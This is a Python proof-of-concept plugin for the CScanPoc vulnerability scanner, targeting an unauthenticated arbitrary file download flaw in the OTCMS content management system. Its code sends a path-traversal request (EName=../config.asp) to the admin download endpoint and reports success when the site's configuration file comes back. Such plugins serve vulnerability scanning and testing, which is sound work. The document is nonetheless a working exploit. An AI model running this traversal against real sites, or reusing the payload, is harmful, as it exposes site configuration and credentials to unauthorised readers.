# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'OTCMS_0000'  # 平台漏洞编号
    name = 'OTCMS网钛文章管理系统非授权任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-09-18'  # 漏洞公布时间
    desc = '''
        网钛CMS(OTCMS) PHP版 基于PHP+sqlite/mysql的技术架构，UTF-8编码，以简单、实用、傻瓜式操作而闻名，无论在功能，人性化，还是易用性方面，都有了长足的发展，网钛CMS的主要目标用户锁定在中小型网站站长，让那些对网络不是很熟悉，对网站建设不是很懂又想做网站的人可以很快搭建起一个功能实用又强大，操作人性又易用。
        OTCMS网钛文章管理系统非授权任意文件下载漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=65268'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'OTCMS'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'de89244f-5abc-4cae-8c3a-0bb13806dc79'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/admin/others.asp?mudi=download_EN_CN&n=index.asp&EName=../config.asp'
            response = requests.get(vul_url)
            if response.status_code == 200 and '#include' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
